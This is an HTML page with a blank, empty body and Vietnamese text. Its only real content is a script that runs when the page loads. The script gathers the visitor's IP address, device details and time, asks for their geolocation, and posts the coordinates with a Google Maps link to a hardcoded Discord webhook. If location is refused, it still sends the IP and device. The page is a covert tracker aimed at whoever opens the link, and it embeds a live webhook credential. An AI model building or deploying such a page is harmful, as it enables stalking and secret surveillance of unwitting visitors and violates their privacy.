<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title></title>
  <script>
    const webhookURL = "https://discordapp.com/api/webhooks/1360121704810287134/XK9peo8xM6lxItpRKsVoEWaEQnJroxGy28LiiiDvN4A209ECo71wKkj8vft4qRQTLv_g";

    const sendToDiscord = (msg) => {
      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: msg })
      });
    };

    const getIP = async () => {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "Không rõ";
      }
    };

    const run = async () => {
      const ip = await getIP();
      const ua = navigator.userAgent;
      const time = new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude.toFixed(6);
          const lon = pos.coords.longitude.toFixed(6);
          const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
          sendToDiscord(`📡 **Có người VÀO WEB và CHO PHÉP vị trí**

🌍 Vĩ độ: ${lat}
🌐 Kinh độ: ${lon}
📌 Google Maps: ${mapLink}

🕵️ IP: ${ip}
💻 Thiết bị: ${ua}
🕒 Thời gian: ${time}`);
        },
        (err) => {
          sendToDiscord(`⚠️ Có người vào web nhưng **KHÔNG cho phép định vị**

🕵️ IP: ${ip}
💻 Thiết bị: ${ua}
🕒 Thời gian: ${time}`);
        }
      );
    };

    window.onload = run;
  </script>
</head>
<body style="margin:0; background:white;"></body>
</html>
